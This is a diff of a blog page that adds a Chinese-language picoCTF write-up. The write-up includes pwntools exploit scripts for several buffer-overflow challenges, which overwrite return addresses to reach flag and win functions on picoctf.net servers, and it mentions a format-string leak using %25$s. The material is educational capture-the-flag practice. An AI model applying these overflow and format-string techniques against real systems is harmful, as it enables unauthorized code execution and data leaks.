@@ -115,7 +115,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -145,6 +145,82 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/picoCTF-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/18/picoCTF-wp/" class="post-title-link" itemprop="url">picoCTF_wp</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-03-18 20:26:42 / Modified: 20:52:08" itemprop="dateCreated datePublished" datetime="2022-03-18T20:26:42+08:00">2022-03-18</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="basic-file-exploit"><a href="#basic-file-exploit" class="headerlink" title="basic-file-exploit"></a>basic-file-exploit</h1><p>根据题目的提示可以知道寻找题目的逻辑漏洞在nc链接后输入两个1后进入2，此时随便输入几个字符串就可以进入到打印flag的函数</p>
+<h1 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h1><h2 id="一道简单的栈溢出题《ret2text》"><a href="#一道简单的栈溢出题《ret2text》" class="headerlink" title="一道简单的栈溢出题《ret2text》"></a>一道简单的栈溢出题《ret2text》</h2><p>exp：<br>from pwn import *<br>io=process(“./vuln1”)<br>io=remote(“saturn.picoctf.net”,64712)<br>payload = b’A’*0x74 + b’A’*4 + p64(0x200A)##这道题因为开了地址随机化所以需要直接把返回地址放在flag的txt段<br>io.sendline(payload)<br>t=io.recv()<br>print(t)  </p>
+<h1 id="CVE-XXXX-XXXX"><a href="#CVE-XXXX-XXXX" class="headerlink" title="CVE-XXXX-XXXX"></a>CVE-XXXX-XXXX</h1><p>直接百度搜索漏洞：picoCTF{CVE-2021-34527}</p>
+<h1 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h1><p>from pwn import *<br>#io=process(“./vuln1”)<br>io=remote(“saturn.picoctf.net”,53672)<br>io.recv()<br>payload1=b’A’*44 + p32(0x80491f6)<br>io.sendline(payload1)<br>io.recvline()<br>t=io.recv()<br>print(t)  </p>
+<h1 id="RPS"><a href="#RPS" class="headerlink" title="RPS"></a>RPS</h1><p>一道简单的石头剪刀布题目，根据hint可以知道需要去分析程序判断胜负的函数，百度那个函数可以知道那个函数是通过判断你输入的字符串是否包含在另一个字符串当中，所以可以直接将三个都输入进去5次获得flag</p>
+<h1 id="x-sixty-what"><a href="#x-sixty-what" class="headerlink" title="x-sixty-what"></a>x-sixty-what</h1><h2 id="一道简单的64位栈溢出题目"><a href="#一道简单的64位栈溢出题目" class="headerlink" title="一道简单的64位栈溢出题目"></a>一道简单的64位栈溢出题目</h2><p>from pwn import *<br>io=process(“./vuln2”)<br>io=remote(“saturn.picoctf.net”,63732)<br>elf=ELF(“./vuln2”)<br>ret=0x000000000040101a<br>flag=elf.symbols[‘flag’]<br>main_addr=elf.symbols[‘main’]<br>print(hex(flag))<br>io.recv()<br>payload=0x40<em>b’A’+0x8</em>b’A’+p64(ret)+p64(flag) ##可能需要加个ret函数去对齐<br>io.sendline(payload)<br>t=io.recv()<br>print(t)</p>
+<h1 id="buffer-overflow-2"><a href="#buffer-overflow-2" class="headerlink" title="buffer overflow 2"></a>buffer overflow 2</h1><h2 id="本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）"><a href="#本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）" class="headerlink" title="本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）"></a>本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</h2><p>from pwn import *<br>#io=gdb.debug(“./vuln3”)<br>io=process(“./vuln3”)<br>#io=remote(“saturn.picoctf.net”,51392)<br>elf=ELF(“./vuln3”)<br>win_addr=elf.symbols[‘win’]<br>main_addr=elf.symbols[‘main’]<br>payload=0x6c*b’A’+b’A’*4+p32(win_addr)+p32(win_addr)+p32(0xCAFEF00D)+p32(0xF00DF00D)<br>io.sendline(payload)<br>#p=io.recv()<br>#print(p)<br>io.interactive()</p>
+<h1 id="flag-leak"><a href="#flag-leak" class="headerlink" title="flag leak"></a>flag leak</h1><p>一道格式化字符串题目，由于掌握的不熟练所以是用枚举法一个一个试出来的，最终是%25$s将位于栈上的flag打印了出来</p>
+<h1 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1"></a>file-run1</h1><p>将题目放在linux里面运行一下就出了flag</p>
+<h1 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2"></a>file-run2</h1><p>将题目放进ida当中可以直接查看flag</p>
+<h1 id="patchme-py"><a href="#patchme-py" class="headerlink" title="patchme.py"></a>patchme.py</h1><p>题目给了一道程序和一个python文件，根据分析python分析python文件可以知道将里面的一个列表按照一定的顺序打印出来并输入进程序就可以出flag</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>a = “!&quot;#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ”+ <br>            “[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ “<br>print(a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68])</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
